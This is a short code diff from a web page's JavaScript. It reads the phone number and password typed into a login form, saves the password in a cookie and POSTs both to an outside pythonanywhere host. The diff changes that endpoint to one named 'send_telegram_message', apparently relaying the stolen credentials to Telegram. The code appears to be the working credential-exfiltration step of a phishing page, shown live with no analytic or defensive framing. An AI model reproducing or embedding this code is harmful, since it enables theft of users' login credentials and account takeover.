@@ -228,7 +228,7 @@
             setCookie("password", document.getElementById('password').value);
 
     let xhr = new XMLHttpRequest();
-    xhr.open("POST", 'https://erikadavis1.pythonanywhere.com');
+    xhr.open("POST", 'https://erikadavis1.pythonanywhere.com/send_telegram_message');
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.withCredentials = false;
     xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
